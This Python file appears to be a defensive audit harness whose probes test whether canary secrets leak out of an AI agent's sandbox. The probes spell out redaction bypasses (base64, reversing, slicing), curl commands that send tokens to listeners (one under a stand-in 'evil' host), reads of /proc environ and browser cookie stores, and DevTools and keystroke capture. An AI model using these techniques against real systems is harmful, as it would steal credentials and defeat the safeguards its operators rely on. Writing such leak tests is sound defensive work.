"""The probes. Each takes the Ctx and returns (leaked, detail): True when the
audited route still yields a canary or a capability, False when it is shut,
None when it cannot be run automatically (SKIPPED, with the reason).

Ids follow secrets-plan.md and secret-roundtrip.md: A1-B6 are the round-trip
routes, X1-X7 and J1-J7 are design/job_probes.sh, N* the cookie and snapshot
routes, BR-* the four bridge operations. "Leaves the computer" probes send only
to the listener the harness runs on the container bridge address."""
import base64
import hashlib
import hmac
import html
import json
import re
import time
import urllib.parse

import canaries as K

SPELLINGS = None


def spellings():
    global SPELLINGS
    if SPELLINGS is None:
        out = []
        for v in K.ALL:
            out += [v, base64.b64encode(v.encode()).decode(), v[::-1]]
        SPELLINGS = out
    return SPELLINGS


def has_canary(text, only=None):
    pool = spellings() if only is None else [x for v in only for x in (v, base64.b64encode(v.encode()).decode(), v[::-1])]
    return any(s in text for s in pool)


def decode_b64_lines(out):
    """Every base64 token printed by a job, decoded where it decodes."""
    found = []
    for tok in re.findall(r"[A-Za-z0-9+/=_-]{8,}", out):
        try:
            found.append(base64.b64decode(tok + "=" * (-len(tok) % 4), validate=False).decode(errors="replace"))
        except Exception:
            pass
    return found


def reply(out):
    m = re.search(r"REPLY (\S+)", out)
    return base64.b64decode(m.group(1)).decode(errors="replace") if m else out


JOB = "probe/job.py"


def job(ctx, *args, wait_ms=60000):
    quoted = " ".join("'" + a.replace("'", "'\\''") + "'" for a in args)
    return ctx.c.sh(f"python3 ~/{JOB} {quoted}", wait_ms=wait_ms)[0]


# --- A: read back into the agent's context ------------------------------------

def a1(ctx):
    sh = ctx.c.sh
    spelled = {}
    spelled["base64"] = sh('printf %s "$CANARY_VAR" | base64')[0]
    spelled["rev"] = sh('printf %s "$CANARY_VAR" | rev')[0]
    spelled["fold"] = "".join(sh('printf %s "$CANARY_VAR" | fold -w1')[0].split())
    spelled["slice"] = sh('V=$CANARY_VAR; printf %s "${V:0:7}"; printf %s "${V:7}"')[0]
    plain = sh('echo "$CANARY_VAR"')[0]
    hit = []
    if K.VAR in "".join(decode_b64_lines(spelled["base64"])):
        hit.append("base64")
    if spelled["rev"].strip()[::-1] == K.VAR:
        hit.append("rev")
    if spelled["fold"] == K.VAR:
        hit.append("fold -w1")
    if spelled["slice"].strip() == K.VAR or K.VAR[:7] in spelled["slice"]:
        hit.append("${V:0:7}")
    note = "plain echo " + ("returned the value" if K.VAR in plain else "was redacted")
    return bool(hit), f"readable as {', '.join(hit) or 'nothing'}; {note}"


def a2(ctx):
    ctx.c.sh('printf %s "$CANARY_VAR" | base64 > ~/workspace/a2.b64')
    text, _ = ctx.c.tool("files", action="get", path="workspace/a2.b64")
    return K.VAR in "".join(decode_b64_lines(text)) or K.VAR in text, "files get of a file holding the value in base64"


A3_PAGE = ('<!doctype html><html><head><meta charset=utf-8><style>'
           'html,body{margin:0;background:#00ffff;height:100%%}pre{display:inline-block;margin:40px;padding:16px;background:#fff;color:#000;'
           'font:28px/40px "DejaVu Sans Mono",monospace;font-variant-ligatures:none;font-kerning:none}</style></head>'
           '<body><pre>%s</pre></body></html>')


def halves(text):
    """Text as two adjacent spans: the same pixels in a monospaced <pre>, but
    no file or reply the computer keeps holds it whole."""
    return f"<span>{text[:9]}</span><span>{text[9:]}</span>"


def page_pixels(ctx, url, record=True):
    """Navigate the general browser and capture the display, as the agent
    sees it, cut to the page's own (cyan) area: the tab title and address
    differ between pages, the page is all that is compared."""
    import pixels
    ctx.c.tool("browser", action="navigate", url=url)
    time.sleep(1.5)
    blocks, _ = ctx.c.call("capture", _record=record)
    data = ctx.c.image(blocks)
    if not data:
        return None
    image = pixels.decode(data)
    box = pixels.bbox(image, pixels.cyan)
    return pixels.crop(image, *box) if box else None


def a3(ctx):
    """A3, the page: the job renders its own $GH_TOKEN in the general browser
    (a stand-in when the key is protected, the key when it is readable), and
    the display's pixels are compared with the real key rendered the same way
    from a page the harness serves. Equal pixels are the key on screen. Three
    controls keep it honest: one text in one node or in two spans captures
    the same, a text one character apart does not, and the same page twice
    is the same."""
    import pixels
    ctx.serve(8001)
    ctx.c.tool("files", action="put", path="probe/a3.tpl", content=A3_PAGE % "@V@")
    ctx.c.sh("python3 -c \"import html,os; p=os.path.expanduser('~/probe/a3.tpl'); "
             "open(os.path.expanduser('~/site/a3-show.html'),'w').write(open(p).read().replace('@V@', html.escape(os.environ.get('GH_TOKEN',''))))\"")
    control = "ghp_" + "Q7" * 18
    other = "ghp_" + "Q7" * 17 + "Q8"
    ctx.L.pages.update({
        "/a3-ref": A3_PAGE % halves(K.GH),
        "/a3-one": A3_PAGE % control,
        "/a3-two": A3_PAGE % halves(control),
        "/a3-other": A3_PAGE % other,
    })
    base = f"http://{ctx.host}:{ctx.port}"
    show = page_pixels(ctx, "http://localhost:8001/a3-show.html")
    # The reference shows the real key, which the capture's text (the page's
    # accessibility tree) carries too: the harness's own page, kept out of
    # the two-condition run's scan of tool results.
    ref = page_pixels(ctx, base + "/a3-ref", record=False)
    one, two, diff = (page_pixels(ctx, base + p) for p in ("/a3-one", "/a3-two", "/a3-other"))
    again = page_pixels(ctx, "http://localhost:8001/a3-show.html")
    ctx.c.tool("browser", action="navigate", url="about:blank")
    if not all((show, again, ref, one, two, diff)):
        return "broken", "no capture of the page on the display"
    if one != two or one == diff or show != again:
        return "broken", "pixel comparison is not sound here (span split, sensitivity or stability control failed)"
    if pixels.count((0, 0, show), pixels.dark) < 200:
        return "broken", "the job's page shows no text"
    same = show == ref
    return same, ("the job's $GH_TOKEN on the display is pixel for pixel the real key" if same
                  else "the job's $GH_TOKEN on the display differs from the real key (its stand-in); controls held")


def a3s(ctx):
    """A3, the sign-in: a login's password typed into its own site's page,
    which is magenta. Until that page is left, neither the browser's
    screenshot of the tab nor a capture of the display may show it."""
    import pixels
    ctx.page()
    page = ('<html><body style="margin:0;background:#ff00ff;min-height:100vh">'
            '<form action="/a3-done" method=post><input name=u type=text><input name=p type=password>'
            '<button>sign in</button></form></body></html>')
    ctx.c.tool("files", action="put", path="site/a3-signin.html", content=page)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/a3-signin.html")
    text, _ = ctx.c.tool("browser", action="text")
    refs = {kind: ref for ref, kind in re.findall(r"\[(e\d+)\] \[(text|password|button)\]", text)}
    if "password" not in refs:
        return "broken", "the sign-in page has no password field: " + text[:80]
    ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
    blocks, _ = ctx.c.call("browser", action="screenshot")
    tab_png = ctx.c.image(blocks)
    tab = pixels.count(pixels.decode(tab_png), pixels.magenta) if tab_png else 0
    blocks, _ = ctx.c.call("capture")
    screen_png = ctx.c.image(blocks)
    screen = pixels.count(pixels.decode(screen_png), pixels.magenta) if screen_png else 0
    # Leave the page, so later probes find the tab as any other.
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    if not screen_png:
        return "broken", "capture gave no image"
    said = ("no image (withheld, or no such action)" if not tab_png else f"shows the page ({tab} px)" if tab > 1000 else "an image without the page")
    return tab > 1000 or screen > 1000, (f"during a sign-in, the tab's screenshot: {said}; the display's capture: "
                                         + (f"shows the page ({screen} px)" if screen > 1000 else "does not show it"))


def a4(ctx):
    """A4 eval btoa: fill a login password on its own site, read it back through eval."""
    ctx.page()
    ref = ctx.ref("password")
    out, _ = ctx.c.tool("browser", action="fill", ref=ref, secret="LOCALAPP.password")
    text, err = ctx.c.tool("browser", action="eval", js="btoa(document.querySelector('input[type=password]').value)")
    got = "".join(decode_b64_lines(text))
    return K.LOCAL_PASSWORD in got, "eval btoa(field.value) on a filled login: " + ("refused" if err and K.LOCAL_PASSWORD not in got else "returned the password" if K.LOCAL_PASSWORD in got else "no value")


def a4v(ctx):
    """A variable is typed into any page, then read back."""
    ctx.page()
    ref = ctx.ref("text")
    out, _ = ctx.c.tool("browser", action="fill", ref=ref, secret="CANARY_VAR")
    text, err = ctx.c.tool("browser", action="eval", js="btoa(document.querySelector('input[type=text]').value)")
    got = "".join(decode_b64_lines(text))
    return K.VAR in got, "fill secret CANARY_VAR on a page, then eval btoa: " + (out.split(";")[0][:60] if K.VAR not in got else "typed and read back")


def a5(ctx):
    return None, "no clipboard_read in this input tool; needs a clipboard reader"


def a6(ctx):
    ctx.c.sh(f"python3 ~/{JOB} plain fill")
    n = ctx.c.sh("grep -l 'hl-canary-pw-9''1c2' ~/.hotline/jobs/*/stdout.log 2>/dev/null | wc -l")[0].strip()
    return n.isdigit() and int(n) > 0, f"raw job logs holding the login password: {n}"


def a7(ctx):
    ctx.c.sh(f"python3 ~/{JOB} plain fill")
    path = ctx.c.sh("grep -l 'hl-canary-pw-9''1c2' ~/.hotline/jobs/*/stdout.log 2>/dev/null | head -1")[0].strip()
    if not path:
        return False, "no job log holds the value"
    rel = path.replace("/home/agent/", "")
    status, _, body = ctx.c.http("GET", "/files/download?path=" + rel)
    return status == 200 and K.PASSWORD.encode() in body, f"GET /files/download of {rel.split('/')[-2][:12]}../stdout.log: {status}"


def a8(ctx):
    out = ctx.c.sh(f"python3 ~/{JOB} plain fill")[0]
    m = re.search(r'"code":\s*"(\d{6})"', out)
    return bool(m), "TOTP digits in a plain tool answer: " + (m.group(0) if m else "none (redacted or no reply)")


# --- B: leaving the container ------------------------------------------------------

def b1(ctx):
    ctx.c.sh(f'curl -s -m8 "http://{ctx.host}:{ctx.port}/b1?v=$(printf %s "$CANARY_VAR" | base64)"')
    if ctx.bound:
        # The bound service itself, the value asked for in a query (audit/listen.py ?v=).
        ctx.c.sh(f'curl -s -m8 "https://{ctx.host}:{ctx.bound.port}/b1?v=$CANARY_VAR"; '
                 f'curl -s -m8 "https://{ctx.host}:{ctx.bound.port}/b1?v=$(printf %s "$CANARY_VAR" | base64)"')
        return (ctx.heard("/b1") or ctx.bound.heard("/b1"),
                "variable sent by curl to the listener, and in a query to the service it is bound to")
    return ctx.heard("/b1"), "variable sent to the host-bridge listener by curl, base64'd"


def b1b(ctx):
    ctx.c.sh(f"python3 ~/{JOB} post http://{ctx.host}:{ctx.port}/b1b fill")
    return ctx.heard("/b1b", only=[K.PASSWORD]), "login password from the bridge POSTed to the listener"


def b2(ctx):
    ctx.page()
    ref_t, ref_b = ctx.ref("text"), ctx.ref("button")
    ctx.c.tool("browser", action="fill", ref=ref_t, secret="CANARY_VAR")
    ctx.c.tool("browser", action="click_ref", ref=ref_b)
    time.sleep(2)
    return ctx.heard("/form"), "variable typed into a local form and submitted to the listener"


def b3(ctx):
    return None, "DNS reachability needs a public lookup; not run (nothing public)"


def b4(ctx):
    ctx.c.sh('printf %s "$CANARY_VAR" > ~/workspace/leak-plain.txt; mkdir -p ~/workspace/"d-$CANARY_VAR"')
    f = ctx.ws / "leak-plain.txt"
    return f.exists() and K.VAR in f.read_text(), "value written to ~/workspace appears in the host folder"


def b5(ctx):
    return None, "desk tools (post_to_chat, send, open_link, model call): desk side, by code reading"


def b6(ctx):
    out = job(ctx, "proc")
    m = re.search(r"^B6 (\S+)", out, re.M)
    mine = hashlib.sha256(ctx.token.encode()).hexdigest()
    return bool(m and mine in m.group(1).split(",")), "bearer read from /proc/*/environ: " + ("found" if m and mine in m.group(1) else "not readable")


# --- bridge operations -----------------------------------------------------------

def br_fill(ctx):
    r = reply(job(ctx, "bridge", "fill", "8"))
    return K.PASSWORD in r, "fill EXAMPLE: " + ("password returned" if K.PASSWORD in r else r[:60])


def br_logins(ctx):
    r = reply(job(ctx, "bridge", "logins", "8"))
    return "canary-user" in r, "logins for example.test: " + ("listed with username" if "canary-user" in r else r[:60])


def br_get(ctx):
    r = reply(job(ctx, "bridge", "get", "8"))
    return "signature" in r or "authenticatorData" in r, "get with a challenge the job chose: " + ("signed assertion returned" if "signature" in r or "authenticatorData" in r else r[:60])


def br_askme(ctx):
    r = reply(job(ctx, "bridge", "askme", "5"))
    return K.ASK_PASSWORD in r, "ask-me fill with no approval: " + ("password returned" if K.ASK_PASSWORD in r else r[:60])


def askme_job(ctx):
    """A job holds an ask-me fill; the harness plays the person and approves once."""
    ctx.c.tool("shell", action="start", command=f"python3 ~/{JOB} post http://{ctx.host}:{ctx.port}/askme askme", wait_ms=500)
    approved = "no hold appeared"
    for _ in range(24):
        status, _, body = ctx.c.http("GET", "/secrets/uses")
        uses = json.loads(body).get("uses", []) if status == 200 else []
        mine = [u for u in uses if u.get("secret") == "ASKME"]
        if mine:
            ctx.c.http("POST", "/secrets/uses/answer", {"id": mine[0]["id"], "answer": "approve"})
            approved = "approved once as the person"
            break
        time.sleep(0.5)
    time.sleep(3)
    return ctx.heard("/askme", only=[K.ASK_PASSWORD]), f"ask-me password POSTed out after a job's own hold ({approved})"


# --- the service, the browser and the display --------------------------------------

def memscan(ctx):
    # Put the canaries through a job first, so the Observer holds what a job printed (audit item 7).
    ctx.c.sh(f"python3 ~/{JOB} plain fill")
    extra = []
    if ctx.delivery == "protected":
        # A protected key must not be in any process a job can read either:
        # used once through the proxy, then looked for, passed reversed so the
        # runner that starts the scan never holds it the right way round.
        ctx.c.sh(f'curl -s -m8 https://{ctx.host}:{ctx.bound.port}/m -H "Authorization: Bearer $GH_TOKEN"; '
                 'echo "$CANARY_VAR $GH_TOKEN"')
        extra = ["--rev", K.VAR[::-1], K.GH[::-1]]
    time.sleep(2)
    out = job(ctx, "memscan", K.PASSWORD, K.ASK_PASSWORD, K._KEY[:40], *extra)
    rows = re.findall(r"MEMSCAN (\d+) (\S+) (DENIED|HITS) (\S+)", out)
    hits = sum(int(r[3]) for r in rows if r[2] == "HITS")
    denied = sum(1 for r in rows if r[2] == "DENIED")
    who = ", ".join(f"{r[1]}={'denied' if r[2] == 'DENIED' else r[3] + ' hits'}" for r in rows)
    return hits > 0, f"hotline-computer processes ({who})"


def proc_line(tag, test):
    def run(ctx):
        if tag in ("X3", "X4"):
            ctx.page()  # the general browser must be running
        out = job(ctx, "proc")
        m = re.search(rf"^{tag} (.*)$", out, re.M)
        line = m.group(1) if m else "no output"
        return test(line), line
    return run


def x_files(ctx):
    out = job(ctx, "proc")
    line = re.search(r"^X1 (.*)$", out, re.M)
    line = line.group(1) if line else "no output"
    return line.split(" ")[0] not in ("none", "no"), "readable service files: " + line


def x6(ctx):
    """Single-user: any DevTools port answering is the leak (its browser holds
    the logins). Split: the general browser's 9222 is the agent's by design;
    the leak is a DevTools endpoint of the broker's or the signed-in browser's
    (uid 1001/1002), or any tab a job reaches that shows a secret."""
    ctx.page()
    out = job(ctx, "proc")
    m = re.search(r"^X6 (.*)$", out, re.M)
    line = m.group(1) if m else "no output"
    if not line.startswith("answered"):
        return False, line
    if not ctx.split:
        return True, "answered"
    shown, leaked = [], False
    for entry in line.split()[1:]:
        port, uid, tabs = entry.split(":", 2)
        text = base64.b64decode(tabs).decode(errors="replace")
        try:
            urls = [t.get("url", "") for t in json.loads(text)]
        except Exception:
            urls = []
        foreign = uid != "uid1000"
        secret = has_canary(text)
        leaked |= foreign or secret
        shown.append(f"{port} ({uid}{', NOT the agent' if foreign else ''}{', shows a secret' if secret else ''}): {', '.join(urls) or 'no tabs'}")
    return leaked, "DevTools a job reaches: " + "; ".join(shown)


def p9222(ctx):
    """The general browser's DevTools port is the agent's by design; what must
    not be there is a tab of a signed-in site (the login's localhost:8000)."""
    ctx.page()
    out = ctx.c.sh("curl -s -m4 http://127.0.0.1:9222/json/list")[0]
    signed_in = "localhost:8000" in out or "example.test" in out
    return signed_in, "curl 127.0.0.1:9222/json/list: " + ("lists the signed-in site's tab" if signed_in else "no signed-in site's tab" if "webSocketDebuggerUrl" in out else "nothing")


def person_types(ctx, text):
    """The person types into the signed-in site the way the desk lets them:
    the site screen (/sites/ws) where the computer has one, else the
    desktop viewer (/ws). The viewer's own protocol, over a bare websocket."""
    import os
    import socket
    import threading
    host, port = ctx.c.base.split("//")[1].split(":")
    status, _, body = ctx.c.http("GET", "/capabilities?nonce=probe")
    split = status == 200 and json.loads(body).get("protected", {}).get("mode") == "split"
    path = ("/sites/ws?site=http%3A%2F%2Flocalhost%3A8000&token=" if split else "/ws?token=") + ctx.token
    s = socket.create_connection((host, int(port)), timeout=20)
    key = base64.b64encode(os.urandom(16)).decode()
    s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
    head = b""
    while b"\r\n\r\n" not in head:
        head += s.recv(1)
    if b" 101 " not in head.split(b"\r\n")[0]:
        return head.split(b"\r\n")[0].decode()
    def drain():  # the screen's frames, read and dropped so it never stalls
        try:
            while s.recv(1 << 20):
                pass
        except OSError:
            pass
    threading.Thread(target=drain, daemon=True).start()

    def send(message):
        data = json.dumps(message).encode()
        mask = os.urandom(4)
        header = bytes([0x81]) + (bytes([0x80 | len(data)]) if len(data) < 126 else bytes([0x80 | 126]) + len(data).to_bytes(2, "big"))
        s.sendall(header + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))
    send({"t": "control", "take": True})
    for ch in text:
        send({"t": "key", "key": ch, "down": True})
        send({"t": "key", "key": ch, "down": False})
        time.sleep(0.05)
    time.sleep(1)
    s.close()
    return "typed through " + path.split("?")[0]


def xinput(ctx):
    ctx.page()
    ctx.c.tool("shell", action="start", command=f"python3 ~/{JOB} xi2 12 > ~/probe/xi2.out 2>&1", wait_ms=500)
    time.sleep(2.5)
    how = person_types(ctx, "hello42")
    time.sleep(9)
    out = ctx.c.sh("cat ~/probe/xi2.out")[0]
    m = re.search(r"rawkeys (\d+)", out)
    n = int(m.group(1)) if m else 0
    return n >= 4, (f"raw key presses seen by a job on the display: {n} of 7 the person typed ({how})" if m else "listener: " + out.strip()[:60])


# --- J: key stand-ins (a protected key's job env holds a stand-in, not the key) ---------
#
# Readable (v1 or v2 readable:true): today's plain-HTTP form, to the listener.
# Protected: the same programs over HTTPS to the fixture the key is bound to,
# through the job's HTTPS_PROXY. J1-J3 must reach the service WITH the key
# (else BROKEN) while the job never holds it; J4-J6 must see only the stand-in.

def tls_cmd(cmd):
    return cmd.replace("http://{H}:{P}/", "https://{H}:{S}/")


def j(tag, cmd, works=False):
    def run(ctx):
        if not ctx.bound:
            ctx.c.sh(cmd.format(H=ctx.host, P=ctx.port, T=tag), wait_ms=40000)
            return ctx.heard("/" + tag, only=[K.GH]), "what the host-bridge listener received from the job's GH_TOKEN"
        out = ctx.c.sh(tls_cmd(cmd).format(H=ctx.host, S=ctx.bound.port, T=tag) + " 2>&1 | base64", wait_ms=40000)[0]
        seen_by_job = K.GH in "".join(decode_b64_lines(out))
        at_service = ctx.bound.heard("/" + tag, only=[K.GH])
        others = ctx.heard("/" + tag, only=[K.GH]) or ctx.free.heard("/" + tag, only=[K.GH])
        if works and not at_service:
            return "broken", "the bound service never received the key through the proxy"
        if works:
            return seen_by_job or others, ("the service received the key through the proxy; the job "
                                           + ("SAW it" if seen_by_job else "held only its stand-in"))
        return at_service or seen_by_job or others, "what the bound service received from the job's GH_TOKEN"
    return run


def j4(ctx):
    if ctx.bound:
        out = ctx.c.sh(f'curl -s -m8 https://{ctx.host}:{ctx.bound.port}/echo-j4 -H "Authorization: Bearer $GH_TOKEN" | base64')[0]
        got = "".join(decode_b64_lines(out))
        if not ctx.bound.heard("/echo-j4", only=[K.GH]):
            return "broken", "the bound service never received the key through the proxy"
        return K.GH in got, "the bound service reflected the key it received; the job got " + (
            "the key" if K.GH in got else "its stand-in" if "ghp_" in got else "nothing")
    out = ctx.c.sh(f'curl -s -m8 http://{ctx.host}:{ctx.port}/echo-j4 -H "Authorization: Bearer $GH_TOKEN" | base64')[0]
    return K.GH in "".join(decode_b64_lines(out)), "reflecting endpoint answered with the job's token"


def j6(ctx):
    if ctx.bound:
        # An unbound host through the job's proxy: a blind tunnel (-k: the job
        # does not trust the fixture's test CA, nor should it).
        ctx.c.sh(f'curl -sk -m8 https://{ctx.host}:{ctx.free.port}/j6 -H "Authorization: Bearer $GH_TOKEN"', wait_ms=40000)
        return ctx.free.heard("/j6", only=[K.GH]), "what an unbound HTTPS host received from the job's GH_TOKEN"
    ctx.c.sh(f'curl -s -m8 --noproxy "*" -H "Host: evil.example.test" http://{ctx.host}:{ctx.port}/j6 -H "Authorization: Bearer $GH_TOKEN"', wait_ms=40000)
    return ctx.heard("/j6", only=[K.GH]), "what the host-bridge listener received from the job's GH_TOKEN"


def a6v(ctx):
    """A variable's value in the job logs, or in any /proc environ a job can read."""
    ctx.c.sh('echo "$CANARY_VAR $GH_TOKEN"; env | grep -c _ >/dev/null')
    out = job(ctx, "scan", K.VAR[::-1], K.GH[::-1])
    m = re.search(r"^SCAN logs=(\d+) environ=(\d+)", out, re.M)
    if not m:
        return None, "scan gave no answer: " + out.strip()[:60]
    logs, environ = int(m.group(1)), int(m.group(2))
    return logs + environ > 0, f"job logs holding a value: {logs}; readable /proc/*/environ holding one: {environ}"


NODE_LINE = "24"


def node(ctx):
    """The node a job runs: the image's, else (the release image has none)
    Node {NODE_LINE} that this harness fetches from nodejs.org into ~/probe
    for J7 alone, checked against its published SHA-256. Test path only."""
    if getattr(ctx, "node", None):
        return ctx.node
    if "yes" in ctx.c.sh("command -v node >/dev/null && echo yes")[0]:
        ctx.node = "node"
        return ctx.node
    import urllib.request
    arch = {"aarch64": "arm64", "x86_64": "x64"}[ctx.c.sh("uname -m")[0].strip()]
    dist = f"https://nodejs.org/dist/latest-v{NODE_LINE}.x/"
    sums = urllib.request.urlopen(dist + "SHASUMS256.txt", timeout=60).read().decode()
    sha, tarball = next(line.split() for line in sums.splitlines() if line.endswith(f"-linux-{arch}.tar.xz"))
    out = ctx.c.sh(f"mkdir -p ~/probe/node && cd ~/probe && curl -fsSL --retry 3 -o node.tar.xz {dist}{tarball} "
                   f"&& echo '{sha}  node.tar.xz' | sha256sum -c - && tar xJf node.tar.xz -C node --strip-components=1 "
                   "&& rm node.tar.xz && ./node/bin/node --version", wait_ms=300000)[0]
    if "OK" not in out:
        raise RuntimeError("could not bring Node into the job: " + out.strip()[-120:])
    ctx.node = "~/probe/node/bin/node"
    return ctx.node


J_NODE = ("{N} -e \"fetch('http://{H}:{P}/{T}',{{headers:{{authorization:'Bearer '+process.env.GH_TOKEN}}}})"
          ".then(r=>console.log('node status',r.status)).catch(e=>{{console.log('node error',(e.cause&&e.cause.code)||e.message);process.exit(1)}})\"")


def j7(ctx):
    """Node's fetch: through the job's proxy (NODE_USE_ENV_PROXY=1 and
    NODE_EXTRA_CA_CERTS, which the computer sets) when the key is protected."""
    return j("j7", J_NODE.replace("{N}", node(ctx)), works=True)(ctx)


J_PY = ("python3 -c \"import os,urllib.request as u; "
        "u.urlopen(u.Request('http://{H}:{P}/{T}', headers={{'Authorization':'token '+os.environ['GH_TOKEN']}}), timeout=8)\"")
J_GIT = ("git -c credential.helper='!f(){{ echo username=x-access-token; echo password=$GH_TOKEN; }}; f' "
         "ls-remote http://{H}:{P}/{T}/o/r.git")


# --- N: cookies, saved logins, snapshots ----------------------------------------------

def share_cookie(ctx):
    """The person shares a signed-in site the way the desk does: PUT /sessions
    where the computer has one (0.13), else today's saved-login upload."""
    if ctx.shared:
        return
    cookie = {"name": "sid", "value": K.COOKIE, "domain": "example.test", "path": "/",
              "secure": True, "httpOnly": True, "expires": time.time() + 86400 * 30}
    status, _, _ = ctx.c.http("PUT", "/sessions/w5probe", {"sites": ["example.test"], "cookies": [cookie], "storage": {}})
    ctx.sessions = status == 200
    if not ctx.sessions:
        doc = {"name": "w5probe", "browser": "chromium", "created_at": "2026-11-19T00:00:00Z",
               "cookies": [cookie], "storage": {}}
        ctx.c.http("POST", "/files?path=.hotline/logins/w5probe.json", raw=json.dumps(doc).encode())
        ctx.c.tool("state", action="login_load", name="w5probe")
    ctx.shared = True


def n1(ctx):
    share_cookie(ctx)
    # Chromium flushes cookies to disk about every 30 s: start the reader as a background job and poll.
    ctx.c.tool("shell", action="start", command=f"python3 ~/{JOB} cookies > ~/probe/n1.out 2>&1", wait_ms=500)
    out = ""
    for _ in range(80):
        out = ctx.c.sh("cat ~/probe/n1.out")[0]
        if out.strip():
            break
        time.sleep(1)
    return "COOKIES row" in out, "job reads a signed-in site's cookie row from ~/.hotline/browser/Default/Cookies: " + (out.strip()[:70] or "no answer")


def n1b(ctx):
    share_cookie(ctx)
    out = ctx.c.sh("cat ~/.hotline/logins/*.json 2>&1 | head -c 4000")[0]
    return K.COOKIE in out, "cat ~/.hotline/logins/*.json " + ("shows the cookie value" if K.COOKIE in out else "shows nothing")


def n2(ctx):
    share_cookie(ctx)
    ctx.c.tool("state", action="snapshot_save", name="w5snap")
    # The person revokes the share.
    ctx.c.http("DELETE", "/sessions/w5probe" if getattr(ctx, "sessions", False) else "/logins/w5probe")
    out = ctx.c.sh("mkdir -p /tmp/n2 && tar xzf ~/.hotline/snapshots/w5snap.tar.gz -C /tmp/n2 ./.hotline/logins 2>&1; cat /tmp/n2/.hotline/logins/*.json 2>&1 | head -c 3000", wait_ms=120000)[0]
    if K.COOKIE in out:
        return True, "the snapshot taken before the revoke still holds the shared cookie: restoring it would sign the site back in"
    if "w5snap.tar.gz: Cannot open" in out:
        return "broken", "no snapshot was saved to look in: " + out.replace("\n", " ")[:80]
    return False, ("the snapshot taken before the revoke holds no copy of the share ("
                   + ("it has no ~/.hotline/logins" if "Not found in archive" in out else "its ~/.hotline/logins holds no cookie") + ")")


def cookie_rows(c, out="probe/ck.out"):
    """job.py cookies as a background job (Chromium writes its cookies about
    every 30 s, longer than one tool call waits), polled to its answer."""
    c.sh(f"rm -f ~/{out}")
    c.tool("shell", action="start", command=f"python3 ~/{JOB} cookies > ~/{out} 2>&1", wait_ms=500)
    for _ in range(90):
        text = c.sh(f"cat ~/{out} 2>/dev/null")[0]
        if text.strip():
            return text.strip()
        time.sleep(1)
    return ""


def n3(ctx):
    """The upgrade run. A home volume is used by a single-user computer
    (--n3-from, a 0.12 image or this one booted as 0.49 creates it): a share
    goes in the 0.12 way (~/.hotline/logins/*.json, then login_load, so its
    cookie is in the browser profile too) and a snapshot is saved. Then the
    same volume boots as this run's computer. Split must have dropped the
    saved logins, cleared the cookie, quarantined the snapshot and said so
    at GET /migration; single-user keeps them all (today's behaviour)."""
    import secrets as _secrets
    vol = f"{ctx.prefix}-n3-{_secrets.token_hex(3)}"
    old, new = vol + "-old", vol + "-new"
    made = []
    try:
        ctx.volume(vol)
        c, _ = ctx.launch(old, ctx.n3_from, split=False, home=vol)
        made.append(old)
        c.http("PUT", "/secrets", raw=K.body("v1")[0], headers={"Content-Type": "application/json"})
        cookie = {"name": "sid", "value": K.COOKIE, "domain": "example.test", "path": "/",
                  "secure": True, "httpOnly": True, "expires": time.time() + 86400 * 30}
        doc = {"name": "w5old", "browser": "chromium", "created_at": "2026-11-01T00:00:00Z", "cookies": [cookie], "storage": {}}
        c.http("POST", "/files?path=.hotline/logins/w5old.json", raw=json.dumps(doc).encode())
        c.tool("state", action="login_load", name="w5old")
        c.sh("mkdir -p ~/probe")
        c.tool("files", action="put", path="probe/job.py", content=ctx.job_source)
        before = cookie_rows(c)
        if "COOKIES row" not in before:
            return "broken", "the old home never held the cookie in its profile: " + before.strip()[:60]
        saved_old, err = c.tool("state", action="snapshot_save", name="w5old")
        if err:
            return "broken", "the old computer could not save a snapshot: " + saved_old.replace("\n", " ")[:80]
        c.sh("cd ~ && rm -r probe")  # leave the home as the person's, so a restore may be asked for
        ctx.remove(old)
        made.remove(old)

        c, _ = ctx.launch(new, ctx.image, split=ctx.split, home=vol)
        made.append(new)
        c.http("PUT", "/secrets", raw=K.body("v1")[0], headers={"Content-Type": "application/json"})
        # First, while the home has nothing of the probe's own: a restore of
        # the old snapshot (snapshot_load wants a desktop with no user files).
        loaded, err = c.tool("state", action="snapshot_load", name="w5old")
        time.sleep(3)
        saved = c.sh("ls ~/.hotline/logins/ 2>/dev/null; cat ~/.hotline/logins/*.json 2>/dev/null | head -c 3000")[0]
        c.sh("mkdir -p ~/probe")
        c.tool("files", action="put", path="probe/job.py", content=ctx.job_source)
        after = cookie_rows(c)
        status, _, body = c.http("GET", "/migration")
        report = json.loads(body) if status == 200 else {}
        held = []
        if K.COOKIE in saved:
            held.append("the saved login file")
        if "COOKIES row" in after:
            held.append("the cookie in the profile")
        if not err:
            held.append("the snapshot restored")
        elif ctx.split and "not restored until the person answers" not in loaded:
            held.append("a snapshot not held back as old (" + loaded.replace("\n", " ")[:60] + ")")
        said = (f"/migration: {report.get('state')}, {report.get('loginsDropped')} logins dropped, "
                f"sites cleared {report.get('sitesCleared')}, quarantined {[s.get('name') for s in report.get('snapshots', [])]}"
                if status == 200 else f"/migration {status}")
        if ctx.split and status == 200:
            if report.get("loginsDropped", 0) < 1 or "w5old" not in [s.get("name") for s in report.get("snapshots", [])]:
                held.append("a /migration that does not report the drop and the quarantine")
            # The person's answer: clean. The snapshot then holds none of it, and restores.
            c.http("POST", "/migration/answer", {"snapshots": "clean"})
            inside = c.sh("tar tzf ~/.hotline/snapshots/w5old.tar.gz 2>/dev/null | grep -c '^./.hotline/\\(logins\\|browser\\|jobs\\)' ; true")[0].strip()
            if inside.splitlines()[-1:] != ["0"]:
                held.append(f"a cleaned snapshot still holding {inside.splitlines()[-1:]} old entries")
            after_answer = json.loads(c.http("GET", "/migration")[2] or b"{}")
            # Cleaned, it restores, with no browser profile in it.
            c.sh("cd ~ && rm -r probe")
            restored, err2 = c.tool("state", action="snapshot_load", name="w5old")
            back = c.sh("ls ~/.hotline/logins/ 2>/dev/null")[0].strip()
            if err2 or back:
                held.append("a cleaned snapshot that " + ("does not restore: " + restored.replace("\n", " ")[:60] if err2 else "brings saved logins back: " + back[:40]))
